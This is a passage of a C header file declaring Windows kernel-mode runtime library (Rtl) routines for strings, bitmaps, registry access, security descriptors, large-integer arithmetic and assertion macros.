RtlxAnsiStringToUnicodeSize(
  IN PCANSI_STRING AnsiString);

#define RtlAnsiStringToUnicodeSize(String) (               \
  NLS_MB_CODE_PAGE_TAG ?                                   \
  RtlxAnsiStringToUnicodeSize(String) :                    \
  ((String)->Length + sizeof(ANSI_NULL)) * sizeof(WCHAR)   \
)

NTSYSAPI
NTSTATUS
NTAPI
RtlAppendUnicodeStringToString(
  IN OUT PUNICODE_STRING Destination,
  IN PCUNICODE_STRING Source);

NTSYSAPI
NTSTATUS
NTAPI
RtlAppendUnicodeToString(
  IN OUT PUNICODE_STRING Destination,
  IN PCWSTR Source);

NTSYSAPI
NTSTATUS
NTAPI
RtlCheckRegistryKey(
  IN ULONG RelativeTo,
  IN PWSTR Path);

NTSYSAPI
VOID
NTAPI
RtlClearAllBits(
  IN PRTL_BITMAP BitMapHeader);

NTSYSAPI
VOID
NTAPI
RtlClearBits(
  IN PRTL_BITMAP BitMapHeader,
  IN ULONG StartingIndex,
  IN ULONG NumberToClear);

NTSYSAPI
SIZE_T
NTAPI
RtlCompareMemory(
  IN CONST VOID *Source1,
  IN CONST VOID *Source2,
  IN SIZE_T Length);

NTSYSAPI
LONG
NTAPI
RtlCompareUnicodeString(
  IN PCUNICODE_STRING String1,
  IN PCUNICODE_STRING String2,
  IN BOOLEAN CaseInSensitive);

NTSYSAPI
LONG
NTAPI
RtlCompareUnicodeStrings(
  IN PCWCH String1,
  IN SIZE_T String1Length,
  IN PCWCH String2,
  IN SIZE_T String2Length,
  IN BOOLEAN CaseInSensitive);

NTSYSAPI
VOID
NTAPI
RtlCopyUnicodeString(
  IN OUT PUNICODE_STRING DestinationString,
  IN PCUNICODE_STRING SourceString OPTIONAL);

NTSYSAPI
NTSTATUS
NTAPI
RtlCreateRegistryKey(
  IN ULONG RelativeTo,
  IN PWSTR Path);

NTSYSAPI
NTSTATUS
NTAPI
RtlCreateSecurityDescriptor(
  IN OUT PSECURITY_DESCRIPTOR SecurityDescriptor,
  IN ULONG Revision);

NTSYSAPI
NTSTATUS
NTAPI
RtlDeleteRegistryValue(
  IN ULONG RelativeTo,
  IN PCWSTR Path,
  IN PCWSTR ValueName);

NTSYSAPI
BOOLEAN
NTAPI
RtlEqualUnicodeString(
  IN CONST UNICODE_STRING *String1,
  IN CONST UNICODE_STRING *String2,
  IN BOOLEAN CaseInSensitive);

#if !defined(_AMD64_) && !defined(_IA64_)
NTSYSAPI
LARGE_INTEGER
NTAPI
RtlExtendedIntegerMultiply(
  IN LARGE_INTEGER Multiplicand,
  IN LONG Multiplier);

NTSYSAPI
LARGE_INTEGER
NTAPI
RtlExtendedLargeIntegerDivide(
  IN LARGE_INTEGER Dividend,
  IN ULONG Divisor,
  OUT PULONG Remainder OPTIONAL);
#endif

#if defined(_X86_) || defined(_IA64_)
NTSYSAPI
LARGE_INTEGER
NTAPI
RtlExtendedMagicDivide(
    IN LARGE_INTEGER Dividend,
    IN LARGE_INTEGER MagicDivisor,
    IN CCHAR  ShiftCount);
#endif

NTSYSAPI
VOID
NTAPI
RtlFreeAnsiString(
  IN PANSI_STRING AnsiString);

NTSYSAPI
ULONG
NTAPI
RtlFindClearBits(
  IN PRTL_BITMAP BitMapHeader,
  IN ULONG NumberToFind,
  IN ULONG HintIndex);

NTSYSAPI
ULONG
NTAPI
RtlFindClearBitsAndSet(
  IN PRTL_BITMAP BitMapHeader,
  IN ULONG NumberToFind,
  IN ULONG HintIndex);

NTSYSAPI
ULONG
NTAPI
RtlFindFirstRunClear(
  IN PRTL_BITMAP BitMapHeader,
  OUT PULONG StartingIndex);

NTSYSAPI
ULONG
NTAPI
RtlFindClearRuns(
  IN PRTL_BITMAP BitMapHeader,
  OUT PRTL_BITMAP_RUN RunArray,
  IN ULONG SizeOfRunArray,
  IN BOOLEAN LocateLongestRuns);

NTSYSAPI
ULONG
NTAPI
RtlFindLastBackwardRunClear(
  IN PRTL_BITMAP BitMapHeader,
  IN ULONG FromIndex,
  OUT PULONG StartingRunIndex);

NTSYSAPI
CCHAR
NTAPI
RtlFindLeastSignificantBit(
  IN ULONGLONG Set);

NTSYSAPI
ULONG
NTAPI
RtlFindLongestRunClear(
  IN PRTL_BITMAP BitMapHeader,
  OUT PULONG StartingIndex);

NTSYSAPI
CCHAR
NTAPI
RtlFindMostSignificantBit(
  IN ULONGLONG Set);

NTSYSAPI
ULONG
NTAPI
RtlFindNextForwardRunClear(
  IN PRTL_BITMAP BitMapHeader,
  IN ULONG FromIndex,
  OUT PULONG StartingRunIndex);

NTSYSAPI
ULONG
NTAPI
RtlFindSetBits(
  IN PRTL_BITMAP BitMapHeader,
  IN ULONG NumberToFind,
  IN ULONG HintIndex);

NTSYSAPI
ULONG
NTAPI
RtlFindSetBitsAndClear(
  IN PRTL_BITMAP BitMapHeader,
  IN ULONG NumberToFind,
  IN ULONG HintIndex);

NTSYSAPI
VOID
NTAPI
RtlInitAnsiString(
  IN OUT PANSI_STRING DestinationString,
  IN PCSZ SourceString);

NTSYSAPI
VOID
NTAPI
RtlInitializeBitMap(
  IN PRTL_BITMAP BitMapHeader,
  IN PULONG BitMapBuffer,
  IN ULONG SizeOfBitMap);

NTSYSAPI
VOID
NTAPI
RtlInitString(
  IN OUT PSTRING DestinationString,
  IN PCSZ SourceString);

NTSYSAPI
NTSTATUS
NTAPI
RtlIntegerToUnicodeString(
  IN ULONG Value,
  IN ULONG Base OPTIONAL,
  IN OUT PUNICODE_STRING String);

NTSYSAPI
NTSTATUS
NTAPI
RtlInt64ToUnicodeString(
  IN ULONGLONG Value,
  IN ULONG Base OPTIONAL,
  IN OUT PUNICODE_STRING String);

#ifdef _WIN64
#define RtlIntPtrToUnicodeString(Value, Base, String) \
    RtlInt64ToUnicodeString(Value, Base, String)
#else
#define RtlIntPtrToUnicodeString(Value, Base, String) \
    RtlIntegerToUnicodeString(Value, Base, String)
#endif

/* BOOLEAN
 * RtlIsZeroLuid(
 *     IN PLUID L1);
 */
#define RtlIsZeroLuid(_L1) \
    ((BOOLEAN) ((!(_L1)->LowPart) && (!(_L1)->HighPart)))

NTSYSAPI
ULONG
NTAPI
RtlLengthSecurityDescriptor(
  IN PSECURITY_DESCRIPTOR SecurityDescriptor);

NTSYSAPI
ULONG
NTAPI
RtlNumberOfClearBits(
  IN PRTL_BITMAP BitMapHeader);

NTSYSAPI
ULONG
NTAPI
RtlNumberOfSetBits(
  IN PRTL_BITMAP BitMapHeader);

NTSYSAPI
NTSTATUS
NTAPI
RtlQueryRegistryValues(
  IN ULONG RelativeTo,
  IN PCWSTR Path,
  IN OUT PRTL_QUERY_REGISTRY_TABLE QueryTable,
  IN PVOID Context OPTIONAL,
  IN PVOID Environment OPTIONAL);

#define SHORT_SIZE  (sizeof(USHORT))
#define SHORT_MASK  (SHORT_SIZE - 1)
#define LONG_SIZE (sizeof(LONG))
#define LONGLONG_SIZE   (sizeof(LONGLONG))
#define LONG_MASK (LONG_SIZE - 1)
#define LONGLONG_MASK   (LONGLONG_SIZE - 1)
#define LOWBYTE_MASK 0x00FF

#define FIRSTBYTE(VALUE)  ((VALUE) & LOWBYTE_MASK)
#define SECONDBYTE(VALUE) (((VALUE) >> 8) & LOWBYTE_MASK)
#define THIRDBYTE(VALUE)  (((VALUE) >> 16) & LOWBYTE_MASK)
#define FOURTHBYTE(VALUE) (((VALUE) >> 24) & LOWBYTE_MASK)

NTSYSAPI
VOID
NTAPI
RtlSetAllBits(
  IN PRTL_BITMAP BitMapHeader);

NTSYSAPI
VOID
NTAPI
RtlSetBits(
  IN PRTL_BITMAP BitMapHeader,
  IN ULONG StartingIndex,
  IN ULONG NumberToSet);

NTSYSAPI
NTSTATUS
NTAPI
RtlSetDaclSecurityDescriptor(
  IN OUT PSECURITY_DESCRIPTOR SecurityDescriptor,
  IN BOOLEAN DaclPresent,
  IN PACL Dacl OPTIONAL,
  IN BOOLEAN DaclDefaulted OPTIONAL);

#if defined(_AMD64_)

/* VOID
 * RtlStoreUlong(
 *     IN PULONG Address,
 *     IN ULONG Value);
 */
#define RtlStoreUlong(Address,Value) \
    *(ULONG UNALIGNED *)(Address) = (Value)

/* VOID
 * RtlStoreUlonglong(
 *     IN OUT PULONGLONG Address,
 *     ULONGLONG Value);
 */
#define RtlStoreUlonglong(Address,Value) \
    *(ULONGLONG UNALIGNED *)(Address) = (Value)

/* VOID
 * RtlStoreUshort(
 *     IN PUSHORT Address,
 *     IN USHORT Value);
 */
#define RtlStoreUshort(Address,Value) \
    *(USHORT UNALIGNED *)(Address) = (Value)

/* VOID
 * RtlRetrieveUshort(
 *     PUSHORT DestinationAddress,
 *    PUSHORT SourceAddress);
 */
#define RtlRetrieveUshort(DestAddress,SrcAddress) \
    *(USHORT UNALIGNED *)(DestAddress) = *(USHORT)(SrcAddress)

/* VOID
 * RtlRetrieveUlong(
 *    PULONG DestinationAddress,
 *    PULONG SourceAddress);
 */
#define RtlRetrieveUlong(DestAddress,SrcAddress) \
    *(ULONG UNALIGNED *)(DestAddress) = *(PULONG)(SrcAddress)

#else

#define RtlStoreUlong(Address,Value)                      \
    if ((ULONG_PTR)(Address) & LONG_MASK) { \
        ((PUCHAR) (Address))[LONG_LEAST_SIGNIFICANT_BIT]    = (UCHAR)(FIRSTBYTE(Value)); \
        ((PUCHAR) (Address))[LONG_3RD_MOST_SIGNIFICANT_BIT] = (UCHAR)(SECONDBYTE(Value)); \
        ((PUCHAR) (Address))[LONG_2ND_MOST_SIGNIFICANT_BIT] = (UCHAR)(THIRDBYTE(Value)); \
        ((PUCHAR) (Address))[LONG_MOST_SIGNIFICANT_BIT]     = (UCHAR)(FOURTHBYTE(Value)); \
    } \
    else { \
        *((PULONG)(Address)) = (ULONG) (Value); \
    }

#define RtlStoreUlonglong(Address,Value) \
    if ((ULONG_PTR)(Address) & LONGLONG_MASK) { \
        RtlStoreUlong((ULONG_PTR)(Address), \
                      (ULONGLONG)(Value) & 0xFFFFFFFF); \
        RtlStoreUlong((ULONG_PTR)(Address)+sizeof(ULONG), \
                      (ULONGLONG)(Value) >> 32); \
    } else { \
        *((PULONGLONG)(Address)) = (ULONGLONG)(Value); \
    }

#define RtlStoreUshort(Address,Value) \
    if ((ULONG_PTR)(Address) & SHORT_MASK) { \
        ((PUCHAR) (Address))[SHORT_LEAST_SIGNIFICANT_BIT] = (UCHAR)(FIRSTBYTE(Value)); \
        ((PUCHAR) (Address))[SHORT_MOST_SIGNIFICANT_BIT ] = (UCHAR)(SECONDBYTE(Value)); \
    } \
    else { \
        *((PUSHORT) (Address)) = (USHORT)Value; \
    }

#define RtlRetrieveUshort(DestAddress,SrcAddress) \
    if ((ULONG_PTR)(SrcAddress) & LONG_MASK) \
    { \
        ((PUCHAR)(DestAddress))[0]=((PUCHAR)(SrcAddress))[0]; \
        ((PUCHAR)(DestAddress))[1]=((PUCHAR)(SrcAddress))[1]; \
    } \
    else \
    { \
        *((PUSHORT)(DestAddress))=*((PUSHORT)(SrcAddress)); \
    }

#define RtlRetrieveUlong(DestAddress,SrcAddress) \
    if ((ULONG_PTR)(SrcAddress) & LONG_MASK) \
    { \
        ((PUCHAR)(DestAddress))[0]=((PUCHAR)(SrcAddress))[0]; \
        ((PUCHAR)(DestAddress))[1]=((PUCHAR)(SrcAddress))[1]; \
        ((PUCHAR)(DestAddress))[2]=((PUCHAR)(SrcAddress))[2]; \
        ((PUCHAR)(DestAddress))[3]=((PUCHAR)(SrcAddress))[3]; \
    } \
    else \
    { \
        *((PULONG)(DestAddress))=*((PULONG)(SrcAddress)); \
    }

#endif /* defined(_AMD64_) */

#ifdef _WIN64
/* VOID
 * RtlStoreUlongPtr(
 *     IN OUT PULONG_PTR Address,
 *     IN ULONG_PTR Value);
 */
#define RtlStoreUlongPtr(Address,Value) RtlStoreUlonglong(Address,Value)
#else
#define RtlStoreUlongPtr(Address,Value) RtlStoreUlong(Address,Value)
#endif /* _WIN64 */

NTSYSAPI
BOOLEAN
NTAPI
RtlTimeFieldsToTime(
  IN PTIME_FIELDS TimeFields,
  IN PLARGE_INTEGER Time);

NTSYSAPI
VOID
NTAPI
RtlTimeToTimeFields(
  IN PLARGE_INTEGER Time,
  IN PTIME_FIELDS TimeFields);

NTSYSAPI
ULONG
FASTCALL
RtlUlongByteSwap(
  IN ULONG Source);

NTSYSAPI
ULONGLONG
FASTCALL
RtlUlonglongByteSwap(
  IN ULONGLONG Source);

NTSYSAPI
NTSTATUS
NTAPI
RtlUnicodeStringToAnsiString(
  IN OUT PANSI_STRING DestinationString,
  IN PCUNICODE_STRING SourceString,
  IN BOOLEAN AllocateDestinationString);

NTSYSAPI
ULONG
NTAPI
RtlxUnicodeStringToAnsiSize(
  IN PCUNICODE_STRING UnicodeString);

#define RtlUnicodeStringToAnsiSize(String) (                  \
    NLS_MB_CODE_PAGE_TAG ?                                    \
    RtlxUnicodeStringToAnsiSize(String) :                     \
    ((String)->Length + sizeof(UNICODE_NULL)) / sizeof(WCHAR) \
)

NTSYSAPI
NTSTATUS
NTAPI
RtlUnicodeStringToInteger(
  IN PCUNICODE_STRING String,
  IN ULONG Base OPTIONAL,
  OUT PULONG Value);

NTSYSAPI
WCHAR
NTAPI
RtlUpcaseUnicodeChar(
  IN WCHAR SourceCharacter);

NTSYSAPI
USHORT
FASTCALL
RtlUshortByteSwap(
  IN USHORT Source);

NTSYSAPI
BOOLEAN
NTAPI
RtlValidRelativeSecurityDescriptor(
  IN PSECURITY_DESCRIPTOR SecurityDescriptorInput,
  IN ULONG SecurityDescriptorLength,
  IN SECURITY_INFORMATION RequiredInformation);

NTSYSAPI
BOOLEAN
NTAPI
RtlValidSecurityDescriptor(
  IN PSECURITY_DESCRIPTOR SecurityDescriptor);

NTSYSAPI
NTSTATUS
NTAPI
RtlWriteRegistryValue(
  IN ULONG RelativeTo,
  IN PCWSTR Path,
  IN PCWSTR ValueName,
  IN ULONG ValueType,
  IN PVOID ValueData,
  IN ULONG ValueLength);


#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */


#if (NTDDI_VERSION >= NTDDI_WIN2KSP3)
NTSYSAPI
VOID
FASTCALL
RtlPrefetchMemoryNonTemporal(
  IN PVOID Source,
  IN SIZE_T Length);
#endif


#if (NTDDI_VERSION >= NTDDI_WINXP)


NTSYSAPI
VOID
NTAPI
RtlClearBit(
  PRTL_BITMAP BitMapHeader,
  ULONG BitNumber);

NTSYSAPI
WCHAR
NTAPI
RtlDowncaseUnicodeChar(
  IN WCHAR SourceCharacter);

NTSYSAPI
VOID
NTAPI
RtlSetBit(
  PRTL_BITMAP BitMapHeader,
  ULONG BitNumber);

NTSYSAPI
BOOLEAN
NTAPI
RtlTestBit(
  IN PRTL_BITMAP BitMapHeader,
  IN ULONG BitNumber);

NTSYSAPI
NTSTATUS
NTAPI
RtlHashUnicodeString(
  IN CONST UNICODE_STRING *String,
  IN BOOLEAN CaseInSensitive,
  IN ULONG HashAlgorithm,
  OUT PULONG HashValue);

#endif /* (NTDDI_VERSION >= NTDDI_WINXP) */


#if (NTDDI_VERSION >= NTDDI_VISTA)

NTSYSAPI
ULONG
NTAPI
RtlNumberOfSetBitsUlongPtr(
  IN ULONG_PTR Target);

NTSYSAPI
ULONGLONG
NTAPI
RtlIoDecodeMemIoResource(
  IN struct _IO_RESOURCE_DESCRIPTOR *Descriptor,
  OUT PULONGLONG Alignment OPTIONAL,
  OUT PULONGLONG MinimumAddress OPTIONAL,
  OUT PULONGLONG MaximumAddress OPTIONAL);

NTSYSAPI
NTSTATUS
NTAPI
RtlIoEncodeMemIoResource(
  IN struct _IO_RESOURCE_DESCRIPTOR *Descriptor,
  IN UCHAR Type,
  IN ULONGLONG Length,
  IN ULONGLONG Alignment,
  IN ULONGLONG MinimumAddress,
  IN ULONGLONG MaximumAddress);

NTSYSAPI
ULONGLONG
NTAPI
RtlCmDecodeMemIoResource(
  IN struct _CM_PARTIAL_RESOURCE_DESCRIPTOR *Descriptor,
  OUT PULONGLONG Start OPTIONAL);

NTSYSAPI
NTSTATUS
NTAPI
RtlFindClosestEncodableLength(
  IN ULONGLONG SourceLength,
  OUT PULONGLONG TargetLength);

NTSYSAPI
NTSTATUS
NTAPI
RtlCmEncodeMemIoResource(
  IN PCM_PARTIAL_RESOURCE_DESCRIPTOR Descriptor,
  IN UCHAR Type,
  IN ULONGLONG Length,
  IN ULONGLONG Start);

#endif /* (NTDDI_VERSION >= NTDDI_VISTA) */

#if (NTDDI_VERSION >= NTDDI_WIN7)

NTSYSAPI
NTSTATUS
NTAPI
RtlUnicodeToUTF8N(
  OUT PCHAR UTF8StringDestination,
  IN ULONG UTF8StringMaxByteCount,
  OUT PULONG UTF8StringActualByteCount,
  IN PCWCH UnicodeStringSource,
  IN ULONG UnicodeStringByteCount);

NTSYSAPI
NTSTATUS
NTAPI
RtlUTF8ToUnicodeN(
  OUT PWSTR UnicodeStringDestination,
  IN ULONG UnicodeStringMaxByteCount,
  OUT PULONG UnicodeStringActualByteCount,
  IN PCCH UTF8StringSource,
  IN ULONG UTF8StringByteCount);

NTSYSAPI
ULONG64
NTAPI
RtlGetEnabledExtendedFeatures(
  IN ULONG64 FeatureMask);

#endif /* (NTDDI_VERSION >= NTDDI_WIN7) */


#if !defined(MIDL_PASS)
/* inline funftions */
//DECLSPEC_DEPRECATED_DDK_WINXP
static __inline
LARGE_INTEGER
NTAPI_INLINE
RtlConvertLongToLargeInteger(
  IN LONG SignedInteger)
{
  LARGE_INTEGER ret;
  ret.QuadPart = SignedInteger;
  return ret;
}

//DECLSPEC_DEPRECATED_DDK_WINXP
static __inline
LARGE_INTEGER
NTAPI_INLINE
RtlConvertUlongToLargeInteger(
  IN ULONG UnsignedInteger)
{
  LARGE_INTEGER ret;
  ret.QuadPart = UnsignedInteger;
  return ret;
}

//DECLSPEC_DEPRECATED_DDK_WINXP
static __inline
LARGE_INTEGER
NTAPI_INLINE
RtlLargeIntegerShiftLeft(
  IN LARGE_INTEGER LargeInteger,
  IN CCHAR ShiftCount)
{
  LARGE_INTEGER Result;

  Result.QuadPart = LargeInteger.QuadPart << ShiftCount;
  return Result;
}

//DECLSPEC_DEPRECATED_DDK_WINXP
static __inline
LARGE_INTEGER
NTAPI_INLINE
RtlLargeIntegerShiftRight(
  IN LARGE_INTEGER LargeInteger,
  IN CCHAR ShiftCount)
{
  LARGE_INTEGER Result;

  Result.QuadPart = (ULONG64)LargeInteger.QuadPart >> ShiftCount;
  return Result;
}

//DECLSPEC_DEPRECATED_DDK
static __inline
ULONG
NTAPI_INLINE
RtlEnlargedUnsignedDivide(
  IN ULARGE_INTEGER Dividend,
  IN ULONG Divisor,
  IN OUT PULONG Remainder)
{
  if (Remainder)
    *Remainder = (ULONG)(Dividend.QuadPart % Divisor);
  return (ULONG)(Dividend.QuadPart / Divisor);
}

//DECLSPEC_DEPRECATED_DDK
static __inline
LARGE_INTEGER
NTAPI_INLINE
RtlLargeIntegerNegate(
  IN LARGE_INTEGER Subtrahend)
{
  LARGE_INTEGER Difference;

  Difference.QuadPart = -Subtrahend.QuadPart;
  return Difference;
}

//DECLSPEC_DEPRECATED_DDK
static __inline
LARGE_INTEGER
NTAPI_INLINE
RtlLargeIntegerSubtract(
  IN LARGE_INTEGER Minuend,
  IN LARGE_INTEGER Subtrahend)
{
  LARGE_INTEGER Difference;

  Difference.QuadPart = Minuend.QuadPart - Subtrahend.QuadPart;
  return Difference;
}

//DECLSPEC_DEPRECATED_DDK
static __inline
LARGE_INTEGER
NTAPI_INLINE
RtlEnlargedUnsignedMultiply(
  IN ULONG Multiplicand,
  IN ULONG Multiplier)
{
  LARGE_INTEGER ret;
  ret.QuadPart = (ULONGLONG)Multiplicand * (ULONGLONG)Multiplier;
  return ret;
}

//DECLSPEC_DEPRECATED_DDK
static __inline
LARGE_INTEGER
NTAPI_INLINE
RtlEnlargedIntegerMultiply(
  IN LONG Multiplicand,
  IN LONG Multiplier)
{
  LARGE_INTEGER ret;
  ret.QuadPart = (LONGLONG)Multiplicand * (ULONGLONG)Multiplier;
  return ret;
}

FORCEINLINE
VOID
RtlInitEmptyAnsiString(
  OUT PANSI_STRING AnsiString,
  IN PCHAR Buffer,
  IN USHORT BufferSize)
{
  AnsiString->Length = 0;
  AnsiString->MaximumLength = BufferSize;
  AnsiString->Buffer = Buffer;
}

FORCEINLINE
VOID
RtlInitEmptyUnicodeString(
  OUT PUNICODE_STRING UnicodeString,
  IN PWSTR Buffer,
  IN USHORT BufferSize)
{
  UnicodeString->Length = 0;
  UnicodeString->MaximumLength = BufferSize;
  UnicodeString->Buffer = Buffer;
}

#if defined(_AMD64_) || defined(_IA64_)

static __inline
LARGE_INTEGER
NTAPI_INLINE
RtlExtendedIntegerMultiply(
  IN LARGE_INTEGER Multiplicand,
  IN LONG Multiplier)
{
  LARGE_INTEGER ret;
  ret.QuadPart = Multiplicand.QuadPart * Multiplier;
  return ret;
}

static __inline
LARGE_INTEGER
NTAPI_INLINE
RtlExtendedLargeIntegerDivide(
  IN LARGE_INTEGER Dividend,
  IN ULONG Divisor,
  OUT PULONG Remainder OPTIONAL)
{
  LARGE_INTEGER ret;
  ret.QuadPart = (ULONG64)Dividend.QuadPart / Divisor;
  if (Remainder)
    *Remainder = (ULONG)(Dividend.QuadPart % Divisor);
  return ret;
}

#endif /* defined(_AMD64_) || defined(_IA64_) */


#if defined(_AMD64_)

#define MultiplyHigh __mulh
#define UnsignedMultiplyHigh __umulh

//DECLSPEC_DEPRECATED_DDK
static __inline
LARGE_INTEGER
NTAPI_INLINE
RtlExtendedMagicDivide(
  IN LARGE_INTEGER Dividend,
  IN LARGE_INTEGER MagicDivisor,
  IN CCHAR ShiftCount)
{
  LARGE_INTEGER ret;
  ULONG64 ret64;
  BOOLEAN Pos;
  Pos = (Dividend.QuadPart >= 0);
  ret64 = UnsignedMultiplyHigh(Pos ? Dividend.QuadPart : -Dividend.QuadPart,
                               MagicDivisor.QuadPart);
  ret64 >>= ShiftCount;
  ret.QuadPart = Pos ? (LONG64)ret64 : -(LONG64)ret64;
  return ret;
}
#endif

//DECLSPEC_DEPRECATED_DDK
static __inline
LARGE_INTEGER
NTAPI_INLINE
RtlLargeIntegerAdd(
  IN LARGE_INTEGER Addend1,
  IN LARGE_INTEGER Addend2)
{
  LARGE_INTEGER ret;
  ret.QuadPart = Addend1.QuadPart + Addend2.QuadPart;
  return ret;
}

/* VOID
 * RtlLargeIntegerAnd(
 *     IN OUT LARGE_INTEGER Result,
 *     IN LARGE_INTEGER Source,
 *     IN LARGE_INTEGER Mask);
 */
#define RtlLargeIntegerAnd(Result, Source, Mask) \
    Result.QuadPart = Source.QuadPart & Mask.QuadPart

//DECLSPEC_DEPRECATED_DDK
static __inline
LARGE_INTEGER
NTAPI_INLINE
RtlLargeIntegerArithmeticShift(
  IN LARGE_INTEGER LargeInteger,
  IN CCHAR ShiftCount)
{
  LARGE_INTEGER ret;
  ret.QuadPart = LargeInteger.QuadPart >> ShiftCount;
  return ret;
}

/* BOOLEAN
 * RtlLargeIntegerEqualTo(
 *     IN LARGE_INTEGER  Operand1,
 *     IN LARGE_INTEGER  Operand2);
 */
#define RtlLargeIntegerEqualTo(X,Y) \
    (!(((X).LowPart ^ (Y).LowPart) | ((X).HighPart ^ (Y).HighPart)))

FORCEINLINE
PVOID
RtlSecureZeroMemory(
  OUT PVOID Pointer,
  IN SIZE_T Size)
{
  volatile char* vptr = (volatile char*)Pointer;
#if defined(_M_AMD64)
  __stosb((PUCHAR)vptr, 0, Size);
#else
  char * endptr = (char *)vptr + Size;
  while (vptr < endptr) {
    *vptr = 0; vptr++;
  }
#endif
   return Pointer;
}

#if defined(_M_AMD64)
FORCEINLINE
BOOLEAN
RtlCheckBit(
  IN PRTL_BITMAP BitMapHeader,
  IN ULONG BitPosition)
{
  return BitTest64((LONG64 CONST*)BitMapHeader->Buffer, (LONG64)BitPosition);
}
#else
#define RtlCheckBit(BMH,BP) (((((PLONG)(BMH)->Buffer)[(BP)/32]) >> ((BP)%32)) & 0x1)
#endif /* defined(_M_AMD64) */

#define RtlLargeIntegerGreaterThan(X,Y) (                              \
    (((X).HighPart == (Y).HighPart) && ((X).LowPart > (Y).LowPart)) || \
    ((X).HighPart > (Y).HighPart)                                      \
)

#define RtlLargeIntegerGreaterThanOrEqualTo(X,Y) (                      \
    (((X).HighPart == (Y).HighPart) && ((X).LowPart >= (Y).LowPart)) || \
    ((X).HighPart > (Y).HighPart)                                       \
)

#define RtlLargeIntegerNotEqualTo(X,Y) (                          \
    (((X).LowPart ^ (Y).LowPart) | ((X).HighPart ^ (Y).HighPart)) \
)

#define RtlLargeIntegerLessThan(X,Y) (                                 \
    (((X).HighPart == (Y).HighPart) && ((X).LowPart < (Y).LowPart)) || \
    ((X).HighPart < (Y).HighPart)                                      \
)

#define RtlLargeIntegerLessThanOrEqualTo(X,Y) (                         \
    (((X).HighPart == (Y).HighPart) && ((X).LowPart <= (Y).LowPart)) || \
    ((X).HighPart < (Y).HighPart)                                       \
)

#define RtlLargeIntegerGreaterThanZero(X) (       \
    (((X).HighPart == 0) && ((X).LowPart > 0)) || \
    ((X).HighPart > 0 )                           \
)

#define RtlLargeIntegerGreaterOrEqualToZero(X) ( (X).HighPart >= 0 )

#define RtlLargeIntegerEqualToZero(X) ( !((X).LowPart | (X).HighPart) )

#define RtlLargeIntegerNotEqualToZero(X) ( ((X).LowPart | (X).HighPart) )

#define RtlLargeIntegerLessThanZero(X) ( ((X).HighPart < 0) )

#define RtlLargeIntegerLessOrEqualToZero(X) ( ((X).HighPart < 0) || !((X).LowPart | (X).HighPart) )

#endif /* !defined(MIDL_PASS) */

/* Byte Swap Functions */
#if (defined(_M_IX86) && (_MSC_FULL_VER > 13009037 || defined(__GNUC__))) || \
    ((defined(_M_AMD64) || defined(_M_IA64)) \
        && (_MSC_FULL_VER > 13009175 || defined(__GNUC__)))

#define RtlUshortByteSwap(_x) _byteswap_ushort((USHORT)(_x))
#define RtlUlongByteSwap(_x) _byteswap_ulong((_x))
#define RtlUlonglongByteSwap(_x) _byteswap_uint64((_x))

#endif

#if DBG

#define ASSERT(exp) \
  (VOID)((!(exp)) ? \
    RtlAssert( (PVOID)#exp, (PVOID)__FILE__, __LINE__, NULL ), FALSE : TRUE)

#define ASSERTMSG(msg, exp) \
  (VOID)((!(exp)) ? \
    RtlAssert( (PVOID)#exp, (PVOID)__FILE__, __LINE__, (PCHAR)msg ), FALSE : TRUE)

#define RTL_SOFT_ASSERT(exp) \
  (VOID)((!(exp)) ? \
    DbgPrint("%s(%d): Soft assertion failed\n   Expression: %s\n", __FILE__, __LINE__, #exp), FALSE : TRUE)

#define RTL_SOFT_ASSERTMSG(msg, exp) \
  (VOID)((!(exp)) ? \
    DbgPrint("%s(%d): Soft assertion failed\n   Expression: %s\n   Message: %s\n", __FILE__, __LINE__, #exp, (msg)), FALSE : TRUE)

#define RTL_VERIFY(exp) ASSERT(exp)
#define RTL_VERIFYMSG(msg, exp) ASSERTMSG(msg, exp)

#define RTL_SOFT_VERIFY(exp) RTL_SOFT_ASSERT(exp)
#define RTL_SOFT_VERIFYMSG(msg, exp) RTL_SOFT_ASSERTMSG(msg, exp)

#if defined(_MSC_VER)

#define NT_ASSERT(exp) \
   ((!(exp)) ? \
      (__annotation(L"Debug", L"AssertFail", L#exp), \
       DbgRaiseAssertionFailure(), FALSE) : TRUE)

#define NT_ASSERTMSG(msg, exp) \
   ((!(exp)) ? \
      (__annotation(L"Debug", L"AssertFail", L##msg), \
      DbgRaiseAssertionFailure(), FALSE) : TRUE)

#define NT_ASSERTMSGW(msg, exp) \
    ((!(exp)) ? \
        (__annotation(L"Debug", L"AssertFail", msg), \
         DbgRaiseAssertionFailure(), FALSE) : TRUE)

#define NT_VERIFY     NT_ASSERT
#define NT_VERIFYMSG  NT_ASSERTMSG
#define NT_VERIFYMSGW NT_ASSERTMSGW

#else

/* GCC doesn't support __annotation (nor PDB) */
#define NT_ASSERT(exp) \
   (VOID)((!(exp)) ? (DbgRaiseAssertionFailure(), FALSE) : TRUE)

#define NT_ASSERTMSG NT_ASSERT
#define NT_ASSERTMSGW NT_ASSERT

#endif

#else /* !DBG */

#define ASSERT(exp) ((VOID) 0)
#define ASSERTMSG(msg, exp) ((VOID) 0)

#define RTL_SOFT_ASSERT(exp) ((VOID) 0)
#define RTL_SOFT_ASSERTMSG(msg, exp) ((VOID) 0)

#define RTL_VERIFY(exp) ((exp) ? TRUE : FALSE)
#define RTL_VERIFYMSG(msg, exp) ((exp) ? TRUE : FALSE)

#define RTL_SOFT_VERIFY(exp) ((exp) ? TRUE : FALSE)
#define RTL_SOFT_VERIFYMSG(msg, exp) ((exp) ? TRUE : FALSE)

#define NT_ASSERT(exp)          ((VOID)0)
#define NT_ASSERTMSG(msg, exp)  ((VOID)0)
#define NT_ASSERTMSGW(msg, exp) ((VOID)0)

#define NT_VERIFY(_exp)           ((_exp) ? TRUE : FALSE)
#define NT_VERIFYMSG(_msg, _exp ) ((_exp) ? TRUE : FALSE)
#define NT_VERIFYMSGW(_msg, _exp) ((_exp) ? TRUE : FALSE)

#endif /* DBG */

#define InitializeListHead32(ListHead) (\
    (ListHead)->Flink = (ListHead)->Blink = PtrToUlong((ListHead)))

#if !defined(_WINBASE_)

#if defined(_WIN64) && (defined(_NTDRIVER_) || defined(_NTDDK_) || defined(_NTIFS_) || defined(_NTHAL_) || defined(_NTOSP_))

NTKERNELAPI
VOID
InitializeSListHead(
  OUT PSLIST_HEADER SListHead);

#else

FORCEINLINE
VOID
InitializeSListHead(
  OUT PSLIST_HEADER SListHead)
{
#if defined(_IA64_)
  ULONG64 FeatureBits;
#endif

#if defined(_WIN64)
  if (((ULONG_PTR)SListHead & 0xf) != 0) {
